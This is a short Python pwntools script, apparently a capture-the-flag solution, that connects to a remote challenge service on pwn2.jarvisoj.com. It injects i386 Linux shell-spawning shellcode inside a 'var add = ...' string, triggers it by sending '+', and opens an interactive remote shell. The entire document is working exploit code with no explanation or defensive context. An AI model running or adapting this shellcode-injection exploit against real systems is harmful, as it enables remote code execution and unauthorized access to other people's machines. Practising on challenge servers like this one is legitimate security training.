#!/usr/bin/env python

from pwn import *

context(arch = 'i386', os = 'linux')

sh = remote("pwn2.jarvisoj.com", 9892)

shellcode = asm(shellcraft.sh())
payload = 'var add = "'+ shellcode + '"'

sh.sendlineafter(">", payload)
sh.sendline('+')

sh.interactive()
sh.close()